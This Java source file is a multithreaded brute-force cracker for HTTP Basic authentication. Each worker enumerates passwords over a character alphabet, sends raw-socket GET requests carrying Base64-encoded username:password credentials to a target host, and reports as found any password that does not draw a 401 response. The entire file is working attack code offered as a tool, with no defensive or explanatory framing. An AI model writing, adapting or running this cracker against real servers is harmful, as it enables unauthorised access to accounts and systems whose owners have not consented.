package com.rodneybeede.security.tools.bruteforce.basicauth;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;

public class WorkerRunnable implements Runnable {
	private final InetSocketAddress remoteSocketAddress;
	private final String userName;
	
	private final int blockStart;
	private final int blockIncrement;
	
	private final long endIndex;
	
	private final char[] alphabet;
	
	
	/**
	 * @param remoteAddr
	 * @param remotePort
	 * @param userName
	 * @param blockStart Which password combination to start at
	 * @param blockIncrement How far to jump ahead in the combinations
	 * @param endIndex The last possible value we shouldn't pass
	 * @param alphabet
	 */
	public WorkerRunnable(String remoteAddr, int remotePort, String userName,
			int blockStart, int blockIncrement, long endIndex, char[] alphabet) {
		super();
		
		this.remoteSocketAddress = new InetSocketAddress(remoteAddr, remotePort);
				
		this.userName = userName;
		this.blockStart = blockStart;
		this.blockIncrement = blockIncrement;
		this.endIndex = endIndex;
		this.alphabet = alphabet;
	}


	@Override
	public void run() {
		log("Starting work on block " + this.blockStart + " increment by " + this.blockIncrement);
		
		log("Starting password will be '" + generatePassword(convertBase(this.blockStart, this.alphabet.length)) + "'");
		log("Next incremented password will be '" + generatePassword(convertBase(this.blockStart + this.blockIncrement, this.alphabet.length)) + "'");
		
		
		String currPassword = null;
		for(long j = this.blockStart; j < this.endIndex; j = j + this.blockIncrement) {
			//TOFIX StringBuffer may be less memory intensive in terms of GC?
			currPassword = generatePassword(convertBase(j, this.alphabet.length));

			//Call method to attempt crack
			boolean successful = crackWith(currPassword);

			if(successful) {
				log("FOUND THE PASSWORD");
				log("FOUND THE PASSWORD");
				log("FOUND THE PASSWORD");
				log("THE PASSWORD IS '" + currPassword + "'");
				log("THE PASSWORD IS '" + currPassword + "'");
				log("THE PASSWORD IS '" + currPassword + "'");
				log("FOUND THE PASSWORD");
				log("FOUND THE PASSWORD");
				log("FOUND THE PASSWORD");

				break;
			}
			
			
			//How many attempts have we done so far?
			if((Math.ceil(j / this.blockIncrement)) % 1000 == 0) {
				log("Completed " + (long) Math.ceil(j / this.blockIncrement) + " attempts thus far");
				System.out.flush();
				Thread.yield();
			}
		}
		
		
		log("Last attempted password was " + currPassword);
		
		
		log("Finished work");
	}
	

	/**
	 * @param value
	 * @param radix
	 * @return Array with converted values (Least significant figure is at the end of the array)
	 */
	private int[] convertBase(final long value, final int radix) {
		ArrayList<Integer> list = new ArrayList<Integer>();
		convertBase(list, value, radix);
		
		int[] returnArray = new int[list.size()];
		for(int i = 0; i < returnArray.length; i++) {
			returnArray[i] = list.get(i).intValue();
		}
		list = null;
		return returnArray;
	}
	
	//Real method that passes list around in memory for speed
	//	Use other convertBase for convenience
	private void convertBase(final ArrayList<Integer> list, final long value, final int radix) {
		if(value < radix) {
			list.add(new Integer((int) value));  //Last one was simple
		} else {
			//Recursively process
			convertBase(list, value / radix, radix);
			list.add((int) (value % radix));
		}
	}
	
	/**
	 * @param alphabetCodes Array index values corresponding to {@link #alphabet}
	 * @return
	 */
	private String generatePassword(final int[] alphabetCodes) {
		char[] passwordChars = new char[alphabetCodes.length];
		for(int i = 0; i < passwordChars.length; i++) {
			passwordChars[i] = alphabet[alphabetCodes[i]];
		}
		
		return new String(passwordChars);
	}
	
	private void log(final String msg) {
		Calendar cal = Calendar.getInstance();
		
		
		
		System.out.println(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(cal.getTime()) + " == " +
				this.getClass().getSimpleName() + " #" + this.blockStart + " -- " + msg);
	}
	
	private void logErr(final String msg, final Exception e) {
		System.out.flush();
		Thread.yield();
		System.err.println(this.getClass().getSimpleName() + " #" + this.blockStart + " -- " + msg);
		if(null != e) {
			e.printStackTrace();
		}
	}

	
	
	//TOFIX Use string buffer instead to spare memory GC?
	private boolean crackWith(final String password) {
		final String unencodedCredentials = this.userName + ":" + password;
		final String encodedCredentials = new String(org.apache.commons.codec.binary.Base64.encodeBase64(unencodedCredentials.getBytes(), false));
		
		
		final Socket socket;
		
		
		final String httpQuery = "GET / HTTP/1.1\r\n" +
			"Host: " + this.remoteSocketAddress.getAddress().getHostAddress() + "\r\n" +
			"Authorization: Basic " + encodedCredentials + "\r\n" +
			"\r\n";
		

		try {
			socket = new Socket();
			socket.connect(this.remoteSocketAddress);
		} catch (IOException e) {
			logErr(e.getMessage() + " on credentials " + unencodedCredentials, e);
			return false;
		}
		
		
		PrintWriter writer;
		try {
			writer = new PrintWriter(socket.getOutputStream(), true);
		} catch (IOException e) {
			logErr("Exception while writing query: " + e.getMessage(), e);
			logErr("Credentials were " + unencodedCredentials, null);
			return false;
		}
		
		writer.write(httpQuery);
		writer.flush();
		
		//Don't close the writer until after you read the response
		//	Otherwise the Socket will close itself without allowing you to read anything
		
		
		BufferedReader reader;
		try {
			reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		} catch (IOException e) {
			logErr("Exception while setting up reader: " + e.getMessage(), e);
			logErr("Credentials were " + unencodedCredentials, null);
			return false;
		}
		
		String firstLine;
		try {
			firstLine = reader.readLine();
		} catch (IOException e) {
			logErr("Exception while reading response: " + e.getMessage(), e);
			logErr("Credentials were " + unencodedCredentials, null);
			return false;
		}
		
		try {
			socket.close();
		} catch (IOException e) {
		}
		
		if(firstLine.contains("401")) {
			return false;
		} else {
			log("Returned success line was " + firstLine);
			
			return true;
		}
	}
}
